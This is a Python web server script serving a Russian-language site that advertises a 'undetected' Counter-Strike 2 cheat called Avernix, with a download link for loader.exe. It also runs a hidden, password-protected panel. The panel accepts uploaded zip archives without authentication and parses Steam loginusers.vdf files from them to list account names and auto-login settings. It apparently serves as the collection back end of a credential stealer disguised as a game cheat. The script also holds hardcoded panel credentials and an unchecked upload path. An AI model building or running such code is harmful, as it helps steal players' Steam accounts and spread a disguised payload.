import os
import secrets
import json
import zipfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote

LOGIN = "JD_REZ937"
PASSWORD = "gsdgt287fdat2"
SITE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS = set()


def parse_multipart(body, boundary):
    files = {}
    sep = ('--' + boundary).encode()
    parts = body.split(sep)
    for part in parts[1:]:
        if part.startswith(b'--'):
            continue
        if part.endswith(b'\r\n'):
            part = part[:-2]
        elif part.endswith(b'\n'):
            part = part[:-1]
        header_end = part.find(b'\r\n\r\n')
        if header_end == -1:
            continue
        headers_raw = part[:header_end].decode('utf-8', errors='replace')
        data = part[header_end + 4:]
        if data.endswith(b'\r\n'):
            data = data[:-2]
        for h in headers_raw.split('\r\n'):
            if 'filename="' in h:
                fname = h.split('filename="')[1].split('"')[0]
                if fname:
                    files[fname] = data
    return files


def parse_vdf(content):
    accounts = []
    lines = content.split('\n')
    in_users = False
    current = None
    depth = 0
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith('"users"'):
            in_users = True
            continue
        if in_users:
            if line == '{':
                depth += 1
                if depth == 2:
                    current = {}
                continue
            if line == '}':
                if depth == 2 and current:
                    accounts.append(current)
                    current = None
                depth -= 1
                if depth == 0:
                    in_users = False
                continue
            if depth == 2 and current is not None:
                parts = line.split('\t')
                if len(parts) >= 2:
                    key = parts[0].strip().strip('"')
                    value = parts[-1].strip().strip('"')
                    current[key] = value
    return accounts


def get_accounts_from_zip(filepath):
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            vdf_names = [n for n in zf.namelist() if n.endswith('loginusers.vdf')]
            if not vdf_names:
                return []
            with zf.open(vdf_names[0]) as f:
                content = f.read().decode('utf-8', errors='replace')
                return parse_vdf(content)
    except Exception:
        return []


LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vход</title>
<style>
@font-face { font-family:'Custom'; src:url('/font.ttf') format('truetype'); font-weight:normal; font-style:normal; }
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#050505; font-family:'Custom',sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#ccc; }
.card { background:#0c0c0c; border:1px solid #1a1a1a; width:380px; padding:0; }
.header { border-bottom:1px solid #1a1a1a; padding:14px 0; text-align:center; }
.header div { font-size:13px; cursor:default; letter-spacing:1px; color:#7c3aed; }
.form { padding:30px 35px 25px; }
.label { font-size:11px; color:#444; margin-bottom:6px; text-transform:lowercase; letter-spacing:0.5px; }
.input { -webkit-appearance:none!important; -moz-appearance:none!important; appearance:none!important; width:100%; padding:12px 14px; background-color:#080808!important; background-image:none!important; border:1px solid #1c1c1c!important; border-radius:0!important; box-shadow:none!important; color:#e0e0e0!important; -webkit-text-fill-color:#e0e0e0!important; font-size:14px; font-family:'Custom',sans-serif; outline:none; margin-bottom:20px; }
.input:focus { border-color:#7c3aed!important; color:#fff!important; -webkit-text-fill-color:#fff!important; }
.input::placeholder { color:#444!important; -webkit-text-fill-color:#444!important; }
.input:-webkit-autofill, .input:-webkit-autofill:hover, .input:-webkit-autofill:focus, .input:-webkit-autofill:active { -webkit-box-shadow:0 0 0 30px #080808 inset!important; -webkit-text-fill-color:#e0e0e0!important; border-color:#1c1c1c!important; transition:background-color 5000s ease-in-out 0s; }
.btn { width:100%; padding:13px; background:#7c3aed; border:none; color:#fff; font-size:14px; font-family:'Custom',sans-serif; cursor:pointer; letter-spacing:1px; text-transform:lowercase; margin-top:5px; }
.btn:hover { background:#6d28d9; }
.error { color:#dc2626; font-size:12px; margin-bottom:10px; text-align:center; display:none; }
.footer { text-align:center; padding:15px 0; font-size:11px; color:#222; border-top:1px solid #111; }
</style>
</head>
<body>
<div class="card">
<div class="header"><div>вход</div></div>
<div class="form">
<div class="error" id="err">неверный логин или пароль</div>
<div class="label">логин</div>
<input class="input" type="text" name="login" form="f" autocomplete="new-password">
<div class="label">пароль</div>
<input class="input" type="password" name="password" form="f" autocomplete="new-password">
<button class="btn" type="submit" form="f">войти</button>
<form id="f" method="POST" action="/login" style="display:none"></form>
</div>
<div class="footer">panel</div>
</div>
<script>if(new URLSearchParams(window.location.search).has('error'))document.getElementById('err').style.display='block'</script>
</body>
</html>"""


LOGS_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Logs</title>
<style>
@font-face { font-family:'Custom'; src:url('/font.ttf') format('truetype'); font-weight:normal; font-style:normal; }
* { margin:0; padding:0; box-sizing:border-box; }
::-webkit-scrollbar { width:6px; }
::-webkit-scrollbar-track { background:#0a0a0a; }
::-webkit-scrollbar-thumb { background:#2a2a2a; }
::-webkit-scrollbar-thumb:hover { background:#3a3a3a; }
body { background:#050505; font-family:'Custom',sans-serif; color:#ccc; min-height:100vh; }
.navbar { display:flex; align-items:center; padding:0 30px; height:56px; border-bottom:1px solid #1a1a1a; }
.nav-brand { font-size:18px; font-style:italic; color:#fff; flex:1; letter-spacing:0.5px; }
.nav-right { display:flex; align-items:center; gap:8px; }
.lang-btn { padding:5px 10px; font-size:11px; font-family:'Custom',sans-serif; border:1px solid #2a2a2a; background:#0c0c0c; color:#666; cursor:pointer; letter-spacing:0.5px; }
.lang-btn.active { background:#1a1a1a; color:#fff; border-color:#7c3aed; }
.icon-btn { width:34px; height:34px; border:1px solid #2a2a2a; background:#0c0c0c; display:flex; align-items:center; justify-content:center; cursor:pointer; text-decoration:none; }
.icon-btn svg { width:16px; height:16px; fill:#555; }
.icon-btn:hover svg { fill:#aaa; }
.content { padding:20px 30px; }
.archive-block { background:#0c0c0c; border:1px solid #1a1a1a; padding:14px 18px; margin-bottom:4px; cursor:pointer; transition:border-color 0.15s; display:flex; justify-content:space-between; align-items:center; }
.archive-block:hover { border-color:#7c3aed; }
.archive-name { font-size:13px; color:#ccc; letter-spacing:0.5px; }
.archive-right { display:flex; align-items:center; gap:12px; }
.archive-time { font-size:11px; color:#444; }
.dl-btn { background:none; border:1px solid #2a2a2a; width:28px; height:28px; display:flex; align-items:center; justify-content:center; cursor:pointer; text-decoration:none; }
.dl-btn svg { width:14px; height:14px; fill:#555; }
.dl-btn:hover svg { fill:#7c3aed; }
.dl-btn:hover { border-color:#7c3aed; }
.empty { color:#222; font-size:13px; text-align:center; padding:40px 0; letter-spacing:0.5px; }
.modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:100; justify-content:center; align-items:center; }
.modal-overlay.open { display:flex; }
.modal { background:#0c0c0c; border:1px solid #1a1a1a; width:500px; max-height:80vh; overflow-y:auto; }
.modal::-webkit-scrollbar { width:6px; }
.modal::-webkit-scrollbar-track { background:#0a0a0a; }
.modal::-webkit-scrollbar-thumb { background:#2a2a2a; }
.modal::-webkit-scrollbar-thumb:hover { background:#3a3a3a; }
.modal-header { display:flex; justify-content:space-between; align-items:center; padding:14px 18px; border-bottom:1px solid #1a1a1a; }
.modal-title { font-size:14px; color:#7c3aed; letter-spacing:0.5px; }
.modal-close { background:none; border:1px solid #2a2a2a; color:#555; width:28px; height:28px; font-size:16px; cursor:pointer; display:flex; align-items:center; justify-content:center; }
.modal-close:hover { color:#fff; border-color:#555; }
.account-panel { border-bottom:1px solid #1a1a1a; }
.account-panel:last-child { border-bottom:none; }
.account-name { padding:12px 18px; font-size:13px; color:#7c3aed; letter-spacing:0.5px; border-bottom:1px solid #111; }
.account-info { padding:10px 18px 14px 30px; }
.account-row { display:flex; font-size:12px; padding:3px 0; }
.account-key { color:#555; min-width:200px; }
.account-val { color:#aaa; }
</style>
</head>
<body>
<div class="navbar">
  <div class="nav-brand" data-ru="логи" data-en="logs">логи</div>
  <div class="nav-right">
    <button class="lang-btn" onclick="setLang('en')">EN</button>
    <button class="lang-btn active" onclick="setLang('ru')">RU</button>
    <a class="icon-btn" href="/logout">
      <svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
    </a>
  </div>
</div>
<div class="content" id="archives"></div>
<div class="modal-overlay" id="modal">
  <div class="modal">
    <div class="modal-header">
      <div class="modal-title" data-ru="Аккаунты" data-en="Accounts">Аккаунты</div>
      <button class="modal-close" onclick="closeModal()">&times;</button>
    </div>
    <div id="modal-body"></div>
  </div>
</div>
<script>
var currentLang = 'ru';
function setLang(l) {
  currentLang = l;
  document.querySelectorAll('.lang-btn').forEach(function(b) {
    b.classList.toggle('active', b.textContent.trim().toLowerCase() === l);
  });
  document.querySelectorAll('[data-' + l + ']').forEach(function(el) {
    el.textContent = el.getAttribute('data-' + l);
  });
  document.documentElement.lang = l === 'ru' ? 'ru' : 'en';
}
function loadArchives() {
  fetch('/api/archives').then(function(r){return r.json()}).then(function(data){
    var c = document.getElementById('archives');
    if (!data.length) {
      c.innerHTML = '<div class="empty" data-ru="нет архивов" data-en="no archives">' + (currentLang==='ru'?'нет архивов':'no archives') + '</div>';
      return;
    }
    var html = '';
    data.forEach(function(a) {
      html += '<div class="archive-block" onclick="openArchive(\\''+a.name+'\\')">';
      html += '<div class="archive-name">'+a.name+'</div>';
      html += '<div class="archive-right">';
      html += '<a class="dl-btn" href="/download/'+encodeURIComponent(a.name)+'.zip" onclick="event.stopPropagation()" title="Скачать"><svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></a>';
      html += '<div class="archive-time">'+a.time+'</div>';
      html += '</div></div>';
    });
    c.innerHTML = html;
  });
}
function openArchive(name) {
  fetch('/api/archive/' + encodeURIComponent(name)).then(function(r){return r.json()}).then(function(accounts){
    var body = document.getElementById('modal-body');
    if (!accounts.length) {
      body.innerHTML = '<div class="empty">нет данных</div>';
    } else {
      var html = '';
      accounts.forEach(function(acc) {
        var pname = acc['PersonaName'] || 'unknown';
        html += '<div class="account-panel">';
        html += '<div class="account-name">' + pname + '</div>';
        html += '<div class="account-info">';
        var keys = ['AccountName','PersonaName','RememberPassword','WantsOfflineMode','SkipOfflineModeWarning','AutoLogin','Timestamp'];
        keys.forEach(function(k) {
          html += '<div class="account-row"><span class="account-key">'+k+'</span><span class="account-val">'+(acc[k]||'')+'</span></div>';
        });
        html += '</div></div>';
      });
      body.innerHTML = html;
    }
    document.getElementById('modal').classList.add('open');
  });
}
function closeModal() {
  document.getElementById('modal').classList.remove('open');
}
document.getElementById('modal').addEventListener('click', function(e) {
  if (e.target === this) closeModal();
});
loadArchives();
</script>
</body>
</html>"""


UPLOAD_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Upload</title>
<style>
@font-face { font-family:'Custom'; src:url('/font.ttf') format('truetype'); font-weight:normal; font-style:normal; }
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#050505; font-family:'Custom',sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#ccc; }
.card { background:#0c0c0c; border:1px solid #1a1a1a; width:420px; padding:0; }
.header { border-bottom:1px solid #1a1a1a; padding:14px 0; text-align:center; }
.header div { font-size:13px; letter-spacing:1px; color:#7c3aed; }
.form { padding:30px 35px 25px; }
.drop { border:2px dashed #1a1a1a; padding:40px 20px; text-align:center; cursor:pointer; transition:border-color 0.15s; margin-bottom:20px; }
.drop:hover { border-color:#7c3aed; }
.drop-text { font-size:12px; color:#444; letter-spacing:0.5px; }
.drop-text span { color:#7c3aed; }
.input-file { display:none; }
.btn { width:100%; padding:13px; background:#7c3aed; border:none; color:#fff; font-size:14px; font-family:'Custom',sans-serif; cursor:pointer; letter-spacing:1px; text-transform:lowercase; }
.btn:hover { background:#6d28d9; }
.btn:disabled { background:#2a2a2a; color:#555; cursor:default; }
.msg { font-size:12px; text-align:center; margin-top:15px; display:none; }
.msg.ok { color:#22c55e; display:block; }
.msg.err { color:#dc2626; display:block; }
.footer { text-align:center; padding:15px 0; font-size:11px; color:#222; border-top:1px solid #111; }
</style>
</head>
<body>
<div class="card">
<div class="header"><div>upload</div></div>
<div class="form">
<div class="drop" id="drop">
  <div class="drop-text">перетащи <span>.zip</span> сюда или нажми</div>
  <input type="file" class="input-file" id="file" accept=".zip">
</div>
<button class="btn" id="btn" disabled>загрузить</button>
<div class="msg" id="msg"></div>
</div>
<div class="footer">panel</div>
</div>
<script>
var drop=document.getElementById('drop'),fileInput=document.getElementById('file'),btn=document.getElementById('btn'),msg=document.getElementById('msg'),selected=null;
drop.addEventListener('click',function(){fileInput.click()});
drop.addEventListener('dragover',function(e){e.preventDefault();drop.style.borderColor='#7c3aed'});
drop.addEventListener('dragleave',function(){drop.style.borderColor='#1a1a1a'});
drop.addEventListener('drop',function(e){e.preventDefault();drop.style.borderColor='#1a1a1a';if(e.dataTransfer.files.length){selected=e.dataTransfer.files[0];update()}});
fileInput.addEventListener('change',function(){if(this.files.length){selected=this.files[0];update()}});
function update(){if(selected&&selected.name.endsWith('.zip')){drop.querySelector('.drop-text').innerHTML=selected.name;btn.disabled=false}else{btn.disabled=true}}
btn.addEventListener('click',function(){
  if(!selected)return;
  var fd=new FormData();fd.append('file',selected);
  var xhr=new XMLHttpRequest();
  xhr.open('POST','/upload',true);
  xhr.onload=function(){
    if(xhr.status===200){msg.textContent='загружено';msg.className='msg ok';selected=null;fileInput.value='';drop.querySelector('.drop-text').innerHTML='перетащи <span>.zip</span> сюда или нажми';btn.disabled=true}
    else{msg.textContent='ошибка';msg.className='msg err'}
  };
  xhr.onerror=function(){msg.textContent='ошибка сети';msg.className='msg err'};
  xhr.send(fd);
});
</script>
</body>
</html>"""


MAIN_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Avernix</title>
<style>
@font-face { font-family:'Custom'; src:url('/font.ttf') format('truetype'); font-weight:normal; font-style:normal; }
* { margin:0; padding:0; box-sizing:border-box; }
::-webkit-scrollbar { width:6px; }
::-webkit-scrollbar-track { background:#000; }
::-webkit-scrollbar-thumb { background:#2a2a2a; }
::-webkit-scrollbar-thumb:hover { background:#3a3a3a; }
body { background:#000; font-family:'Custom',sans-serif; color:#ccc; min-height:100vh; }
.hero { position:relative; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
.hero-bg { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; filter:brightness(0.35) contrast(1.2) saturate(0.7); }
.hero-overlay { position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.7) 60%, #000 100%); }
.hero-content { position:relative; z-index:1; text-align:center; max-width:600px; padding:0 20px; }
.hero-badge { display:inline-flex; align-items:center; gap:6px; background:#0a0a0a; border:1px solid #1a1a1a; padding:6px 14px; margin-bottom:24px; font-size:11px; color:#7c3aed; letter-spacing:1px; text-transform:uppercase; }
.hero-badge svg { width:12px; height:12px; fill:#7c3aed; }
.hero-title { font-size:56px; color:#fff; letter-spacing:4px; margin-bottom:8px; line-height:1.2; font-weight:700; }
.hero-sub { font-size:13px; color:#444; letter-spacing:2px; margin-bottom:16px; line-height:1.6; text-transform:uppercase; }
.hero-sub2 { font-size:14px; color:#555; letter-spacing:0.5px; margin-bottom:40px; line-height:1.6; }
.hero-dl { display:inline-flex; align-items:center; gap:10px; background:#1a1a1a; border:1px solid #7c3aed; padding:16px 40px; color:#fff; font-size:16px; font-family:'Custom',sans-serif; cursor:pointer; letter-spacing:1px; text-decoration:none; transition:all 0.2s; }
.hero-dl:hover { background:#7c3aed; transform:translateY(-1px); }
.hero-dl svg { width:20px; height:20px; fill:#fff; }
.hero-info { display:flex; justify-content:center; gap:24px; margin-top:24px; }
.hero-info-item { display:flex; align-items:center; gap:6px; font-size:11px; color:#333; letter-spacing:0.5px; }
.hero-info-item svg { width:12px; height:12px; fill:#7c3aed; }
.features { padding:80px 30px; max-width:900px; margin:0 auto; }
.section-label { font-size:11px; color:#7c3aed; letter-spacing:2px; text-transform:uppercase; text-align:center; margin-bottom:12px; }
.section-title { font-size:24px; color:#fff; text-align:center; letter-spacing:1px; margin-bottom:50px; }
.feature-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:16px; }
.feature-card { background:#080808; border:1px solid #151515; padding:28px 24px; transition:border-color 0.2s; }
.feature-card:hover { border-color:#7c3aed; }
.feature-icon { width:36px; height:36px; border:1px solid #1a1a1a; display:flex; align-items:center; justify-content:center; margin-bottom:16px; }
.feature-icon svg { width:18px; height:18px; fill:#7c3aed; }
.feature-name { font-size:13px; color:#fff; letter-spacing:0.5px; margin-bottom:8px; }
.feature-desc { font-size:12px; color:#444; line-height:1.6; }
.status { padding:80px 30px; max-width:700px; margin:0 auto; }
.status-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }
.status-card { background:#080808; border:1px solid #151515; padding:20px; text-align:center; }
.status-label { font-size:10px; color:#333; letter-spacing:1px; text-transform:uppercase; margin-bottom:6px; }
.status-val { font-size:16px; color:#7c3aed; letter-spacing:1px; }
.status-val.green { color:#22c55e; }
.footer { text-align:center; padding:40px 30px; border-top:1px solid #0a0a0a; }
.footer-text { font-size:11px; color:#1a1a1a; letter-spacing:0.5px; }
</style>
</head>
<body>
<div class="hero">
  <img class="hero-bg" src="/Cs2.jpg" alt="">
  <div class="hero-overlay"></div>
  <div class="hero-content">
    <div class="hero-badge">
      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
      <span>v0.1 alpha</span>
    </div>
    <div class="hero-title">Avernix</div>
    <div class="hero-sub">internal cheat for cs2</div>
    <div class="hero-sub2">undetected custom injection</div>
    <a class="hero-dl" href="/download/loader.exe">
      <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
      download
    </a>
    <div class="hero-info">
      <div class="hero-info-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>windows 10/11</span>
      </div>
      <div class="hero-info-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>vac safe</span>
      </div>
      <div class="hero-info-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>f2p & prime</span>
      </div>
    </div>
  </div>
</div>
<div class="features" id="features">
  <div class="section-label">features</div>
  <div class="section-title">what's inside</div>
  <div class="feature-grid">
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
      </div>
      <div class="feature-name">aimbot</div>
      <div class="feature-desc">silent aim, fov control, smooth settings, bone priority, target switch delay</div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </div>
      <div class="feature-name">visuals</div>
      <div class="feature-desc">snaplines, head circle, health bar, weapon icon, bomb timer, penetration crosshair</div>
    </div>
    <div class="feature-card">
      <div class="feature-icon">
        <svg viewBox="0 0 24 24"><path d="M17 16l-4-4V8.82C14.16 8.4 15 7.3 15 6c0-1.66-1.34-3-3-3S9 4.34 9 6c0 1.3.84 2.4 2 2.82V12l-4 4H3v5h5v-3.05l4-4.2 4 4.2V21h5v-5h-4z"/></svg>
      </div>
      <div class="feature-name">misc</div>
      <div class="feature-desc">auto bhop, edge jump, radar hack, anti-aim, fake duck, movement sync</div>
    </div>
  </div>
</div>
<div class="status">
  <div class="section-label">status</div>
  <div class="section-title">current build</div>
  <div class="status-grid">
    <div class="status-card">
      <div class="status-label">status</div>
      <div class="status-val green">safe</div>
    </div>
    <div class="status-card">
      <div class="status-label">cs2 build</div>
      <div class="status-val">1475</div>
    </div>
    <div class="status-card">
      <div class="status-label">version</div>
      <div class="status-val">0.1</div>
    </div>
  </div>
</div>
<div class="footer">
  <div class="footer-text">avernix</div>
</div>
</body>
</html>"""


class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass

    def handle_error(self, *args):
        pass

    def send_html(self, code, html):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def send_json(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode("utf-8"))

    def check_session(self):
        cookies = self.headers.get("Cookie", "")
        for c in cookies.split(";"):
            c = c.strip()
            if c.startswith("session="):
                return c.split("=", 1)[1] in SESSIONS
        return False

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/" or path == "/main":
            self.send_html(200, MAIN_PAGE)
            return

        if path == "/logout":
            cookies = self.headers.get("Cookie", "")
            for c in cookies.split(";"):
                c = c.strip()
                if c.startswith("session="):
                    SESSIONS.discard(c.split("=", 1)[1])
            self.send_response(302)
            self.send_header("Location", "/login")
            self.send_header("Set-Cookie", "session=; Path=/; Max-Age=0")
            self.end_headers()
            return

        if path == "/font.ttf":
            font_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "font.ttf")
            if os.path.exists(font_path):
                self.send_response(200)
                self.send_header("Content-Type", "font/ttf")
                self.end_headers()
                with open(font_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404)
            return

        if path == "/Cs2.jpg":
            img_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Cs2.jpg")
            if os.path.exists(img_path):
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.end_headers()
                with open(img_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404)
            return

        if path == "/download/loader.exe":
            exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loader.exe")
            if os.path.exists(exe_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", 'attachment; filename="loader.exe"')
                self.send_header("Content-Length", str(os.path.getsize(exe_path)))
                self.end_headers()
                with open(exe_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404)
            return

        if path == "/login":
            self.send_html(200, LOGIN_PAGE)
            return

        if path == "/upload":
            self.send_html(200, UPLOAD_PAGE)
            return

        if path == "/logs":
            if not self.check_session():
                self.send_response(302)
                self.send_header("Location", "/login")
                self.end_headers()
                return
            self.send_html(200, LOGS_PAGE)
            return

        if path == "/api/archives":
            if not self.check_session():
                self.send_json(401, [])
                return
            archives = []
            for f in os.listdir(SITE_DIR):
                if f.endswith(".zip"):
                    name = f[:-4]
                    full = os.path.join(SITE_DIR, f)
                    mtime = os.path.getmtime(full)
                    dt = datetime.fromtimestamp(mtime)
                    archives.append({"name": name, "time": dt.strftime("%H:%M %d.%m.%Y")})
            archives.sort(key=lambda x: x["time"], reverse=True)
            self.send_json(200, archives)
            return

        if path.startswith("/api/archive/"):
            if not self.check_session():
                self.send_json(401, [])
                return
            name = unquote(path[len("/api/archive/"):])
            zip_path = os.path.join(SITE_DIR, name + ".zip")
            if not os.path.exists(zip_path):
                self.send_json(404, [])
                return
            accounts = get_accounts_from_zip(zip_path)
            self.send_json(200, accounts)
            return

        if path.startswith("/download/"):
            if not self.check_session():
                self.send_response(302)
                self.send_header("Location", "/login")
                self.end_headers()
                return
            fname = unquote(path[len("/download/"):])
            fpath = os.path.join(SITE_DIR, fname)
            if not os.path.exists(fpath) or not fname.endswith(".zip"):
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
            self.send_header("Content-Length", str(os.path.getsize(fpath)))
            self.end_headers()
            with open(fpath, "rb") as f:
                self.wfile.write(f.read())
            return

        self.send_response(302)
        self.send_header("Location", "/login")
        self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8")
            params = parse_qs(body)
            login = params.get("login", [""])[0]
            password = params.get("password", [""])[0]
            if login == LOGIN and password == PASSWORD:
                token = secrets.token_hex(32)
                SESSIONS.add(token)
                self.send_response(302)
                self.send_header("Location", "/logs")
                self.send_header("Set-Cookie", f"session={token}; Path=/; HttpOnly")
                self.end_headers()
            else:
                self.send_response(302)
                self.send_header("Location", "/login?error=1")
                self.end_headers()
            return

        if path == "/upload":
            ct = self.headers.get("Content-Type", "")
            if "multipart/form-data" not in ct:
                self.send_json(400, {"error": "bad content-type"})
                return
            boundary = ct.split("boundary=")[-1].strip()
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            files = parse_multipart(body, boundary)
            saved = []
            for fname, data in files.items():
                if fname.endswith(".zip"):
                    filepath = os.path.join(SITE_DIR, fname)
                    with open(filepath, 'wb') as f:
                        f.write(data)
                    saved.append(fname)
            if saved:
                self.send_json(200, {"ok": True, "files": saved})
            else:
                self.send_json(400, {"error": "no zip files"})
            return

        self.send_error(404)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 29263))
    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}")
    server.serve_forever()
